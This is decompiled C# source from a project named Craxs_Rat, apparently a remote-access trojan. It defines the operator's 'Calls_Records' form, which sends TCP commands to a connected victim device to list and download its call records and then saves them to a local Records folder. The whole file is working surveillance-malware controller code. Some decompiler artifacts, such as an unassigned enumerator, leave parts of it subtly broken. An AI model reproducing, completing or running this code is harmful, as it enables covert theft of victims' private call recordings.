using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat
{
	// Token: 0x0200003A RID: 58
	[DesignerGenerated]
	public partial class Calls_Records : Form
	{
		// Token: 0x06000427 RID: 1063 RVA: 0x00023D90 File Offset: 0x00021F90
		public Calls_Records()
		{
			base.Load += this.Calls_Records_Load;
			base.FormClosing += this.Calls_Records_FormClosing;
			this.string_0 = "null";
			this.object_0 = new TcpClient();
			this.InitializeComponent();
		}

		// Token: 0x17000170 RID: 368
		// (get) Token: 0x0600042A RID: 1066 RVA: 0x00002927 File Offset: 0x00000B27
		// (set) Token: 0x0600042B RID: 1067 RVA: 0x00024988 File Offset: 0x00022B88
		internal virtual DataGridView DataGridView1 { get; set; }

		// Token: 0x17000171 RID: 369
		// (get) Token: 0x0600042C RID: 1068 RVA: 0x0000292F File Offset: 0x00000B2F
		// (set) Token: 0x0600042D RID: 1069 RVA: 0x0002499C File Offset: 0x00022B9C
		internal virtual DataGridViewTextBoxColumn thestat { get; set; }

		// Token: 0x17000172 RID: 370
		// (get) Token: 0x0600042E RID: 1070 RVA: 0x00002937 File Offset: 0x00000B37
		// (set) Token: 0x0600042F RID: 1071 RVA: 0x000249B0 File Offset: 0x00022BB0
		internal virtual DataGridViewImageColumn ico { get; set; }

		// Token: 0x17000173 RID: 371
		// (get) Token: 0x06000430 RID: 1072 RVA: 0x0000293F File Offset: 0x00000B3F
		// (set) Token: 0x06000431 RID: 1073 RVA: 0x000249C4 File Offset: 0x00022BC4
		internal virtual DataGridViewTextBoxColumn num { get; set; }

		// Token: 0x17000174 RID: 372
		// (get) Token: 0x06000432 RID: 1074 RVA: 0x00002947 File Offset: 0x00000B47
		// (set) Token: 0x06000433 RID: 1075 RVA: 0x000249D8 File Offset: 0x00022BD8
		internal virtual DataGridViewTextBoxColumn appnam { get; set; }

		// Token: 0x17000175 RID: 373
		// (get) Token: 0x06000434 RID: 1076 RVA: 0x0000294F File Offset: 0x00000B4F
		// (set) Token: 0x06000435 RID: 1077 RVA: 0x000249EC File Offset: 0x00022BEC
		internal virtual DataGridViewTextBoxColumn stus { get; set; }

		// Token: 0x17000176 RID: 374
		// (get) Token: 0x06000436 RID: 1078 RVA: 0x00002957 File Offset: 0x00000B57
		// (set) Token: 0x06000437 RID: 1079 RVA: 0x00024A00 File Offset: 0x00022C00
		internal virtual Panel Panel1 { get; set; }

		// Token: 0x17000177 RID: 375
		// (get) Token: 0x06000438 RID: 1080 RVA: 0x0000295F File Offset: 0x00000B5F
		// (set) Token: 0x06000439 RID: 1081 RVA: 0x00024A14 File Offset: 0x00022C14
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon4
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon4;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon4_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon4 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon4;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000178 RID: 376
		// (get) Token: 0x0600043A RID: 1082 RVA: 0x00002967 File Offset: 0x00000B67
		// (set) Token: 0x0600043B RID: 1083 RVA: 0x00024A58 File Offset: 0x00022C58
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon1
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon1;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon1_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon1 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon1;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x17000179 RID: 377
		// (get) Token: 0x0600043C RID: 1084 RVA: 0x0000296F File Offset: 0x00000B6F
		// (set) Token: 0x0600043D RID: 1085 RVA: 0x00024A9C File Offset: 0x00022C9C
		internal virtual DrakeUILoadingBar loadingbar { get; set; }

		// Token: 0x1700017A RID: 378
		// (get) Token: 0x0600043E RID: 1086 RVA: 0x00002977 File Offset: 0x00000B77
		// (set) Token: 0x0600043F RID: 1087 RVA: 0x00024AB0 File Offset: 0x00022CB0
		internal virtual DrakeUIButtonIcon DrakeUIButtonIcon2
		{
			[CompilerGenerated]
			get
			{
				return this._DrakeUIButtonIcon2;
			}
			[CompilerGenerated]
			set
			{
				EventHandler value2 = new EventHandler(this.DrakeUIButtonIcon2_Click);
				DrakeUIButtonIcon drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click -= value2;
				}
				this._DrakeUIButtonIcon2 = value;
				drakeUIButtonIcon = this._DrakeUIButtonIcon2;
				if (drakeUIButtonIcon != null)
				{
					drakeUIButtonIcon.Click += value2;
				}
			}
		}

		// Token: 0x06000440 RID: 1088 RVA: 0x00024AF4 File Offset: 0x00022CF4
		public void method_1(object[] objects_0)
		{
			if (!this.DataGridView1.InvokeRequired)
			{
				try
				{
					int index = this.DataGridView1.Rows.Add(new object[]
					{
						objects_0[0],
						objects_0[1],
						objects_0[2],
						objects_0[3],
						objects_0[5]
					});
					DataGridViewRow dataGridViewRow = this.DataGridView1.Rows[index];
					dataGridViewRow.Tag = RuntimeHelpers.GetObjectValue(objects_0[6]);
					return;
				}
				catch (Exception ex)
				{
					return;
				}
			}
			Calls_Records.GDelegate7 method = new Calls_Records.GDelegate7(this.method_1);
			this.DataGridView1.Invoke(method, new object[]
			{
				objects_0
			});
		}

		// Token: 0x06000441 RID: 1089 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_2(object sender, EventArgs e)
		{
		}

		// Token: 0x06000442 RID: 1090 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_3(object sender, EventArgs e)
		{
		}

		// Token: 0x06000443 RID: 1091 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_4(object sender, EventArgs e)
		{
		}

		// Token: 0x06000444 RID: 1092 RVA: 0x00024BAC File Offset: 0x00022DAC
		private void Calls_Records_Load(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"GRC<*>T",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				this.loadingbar.Enabled = true;
				this.loadingbar.Visible = true;
			}
		}

		// Token: 0x06000445 RID: 1093 RVA: 0x00024CD8 File Offset: 0x00022ED8
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				if (this.DataGridView1.SelectedRows.Count > 0)
				{
					try
					{
						foreach (object obj in this.DataGridView1.SelectedRows)
						{
							object objectValue = RuntimeHelpers.GetObjectValue(obj);
							string[] array = this.gclass8_0.string_0.Split(new char[]
							{
								':'
							});
							int value = 0;
							int value2 = 0;
							if (NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null) != null)
							{
								object[] objects_ = new object[]
								{
									this.gclass8_0.tcpClient_0,
									Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
									{
										Module13.string_29,
										GClass9.string_0,
										"gtrc<*>",
										NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null).ToString(),
										"#"
									}), NewLateBinding.LateGet(objectValue, null, "tag", new object[0], null, null, null)), GClass9.string_0), array[0]), GClass9.string_0), array[1]), GClass9.string_0), Module13.string_5), GClass9.string_0), Conversions.ToString(value)), GClass9.string_0), Conversions.ToString(value2)), GClass9.string_0), GClass9.string_3), GClass9.string_0), this.gclass8_0.string_2),
									Module2.smethod_9().GetBytes("null"),
									this.gclass8_0
								};
								this.gclass8_0.method_2(objects_);
							}
						}
						return;
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				Interaction.MsgBox("Select Record To Download!!!", MsgBoxStyle.MsgBoxHelp, null);
			}
		}

		// Token: 0x06000446 RID: 1094 RVA: 0x00024EF4 File Offset: 0x000230F4
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			try
			{
				if (!Directory.Exists(this.string_1 + "\\Records"))
				{
					Directory.CreateDirectory(this.string_1 + "\\Records");
				}
				Process.Start(this.string_1 + "\\Records");
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000447 RID: 1095 RVA: 0x00024F68 File Offset: 0x00023168
		private void Calls_Records_FormClosing(object sender, FormClosingEventArgs e)
		{
			try
			{
				this.loadingbar.Visible = false;
				this.loadingbar.Enabled = false;
				this.loadingbar.Dispose();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x06000448 RID: 1096 RVA: 0x00024BAC File Offset: 0x00022DAC
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			if (this.gclass8_0 != null)
			{
				string[] array = this.gclass8_0.string_0.Split(new char[]
				{
					':'
				});
				object[] objects_ = new object[]
				{
					this.object_0,
					string.Concat(new string[]
					{
						Module13.string_29,
						GClass9.string_0,
						"GRC<*>T",
						GClass9.string_0,
						array[0],
						GClass9.string_0,
						array[1],
						GClass9.string_0,
						Module13.string_5,
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						Conversions.ToString(0),
						GClass9.string_0,
						GClass9.string_3,
						GClass9.string_0,
						this.gclass8_0.string_2
					}),
					Module2.smethod_9().GetBytes("null"),
					this.gclass8_0
				};
				this.gclass8_0.method_2(objects_);
				this.loadingbar.Enabled = true;
				this.loadingbar.Visible = true;
			}
		}

		// Token: 0x040001E5 RID: 485
		public string string_0;

		// Token: 0x040001E6 RID: 486
		public GClass8 gclass8_0;

		// Token: 0x040001E7 RID: 487
		public TcpClient object_0;

		// Token: 0x040001E8 RID: 488
		public string string_1;

		// Token: 0x0200003B RID: 59
		// (Invoke) Token: 0x0600044C RID: 1100
		public delegate void GDelegate7(object[] objects_0);
	}
}
